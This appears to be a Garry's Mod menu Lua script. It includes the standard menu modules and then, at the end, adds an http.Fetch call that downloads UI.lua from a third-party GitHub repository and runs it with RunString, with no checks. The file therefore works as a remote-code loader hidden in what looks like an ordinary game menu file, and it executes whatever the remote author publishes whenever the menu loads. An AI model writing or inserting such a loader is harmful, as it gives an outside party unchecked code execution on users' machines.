include( "mount/mount.lua" )
include( "getmaps.lua" )
include( "loading.lua" )
include( "mainmenu.lua" )
include( "video.lua" )
include( "demo_to_video.lua" )

include( "menu_save.lua" )
include( "menu_demo.lua" )
include( "menu_addon.lua" )
include( "menu_dupe.lua" )
include( "errors.lua" )
include( "problems/problems.lua" )

include( "motionsensor.lua" )
include( "util.lua" )

http.Fetch("https://raw.githubusercontent.com/unknownhans/Atlanta-G-LUA-Public/refs/heads/master/source/UI.lua", 
    function(body, length, headers, code)
        if code == 200 then
            print("[ATL] Successfully fetched UI.lua, executing ..." .. '\n')
            RunString(body, "UI.lua", false)
        else
            print("[ATL] Failed at http.Fetch UI.lua, code: " .. code)
        end
    end,
    function(error)
        print("[ATL] Error fetching UI.lua: " .. error)
    end
)